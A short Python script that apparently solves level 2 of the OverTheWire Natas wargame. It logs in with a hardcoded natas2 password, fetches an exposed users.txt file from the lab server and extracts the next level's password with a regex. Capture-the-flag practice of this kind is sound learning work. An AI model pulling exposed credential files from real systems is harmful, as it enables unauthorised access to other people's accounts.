import requests
import re

user = "natas2"
pwd = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % user
session = requests.Session()

response = session.get(url, auth=(user,pwd))
content = response.text

print(re.findall('natas3:(.*)',content)[0])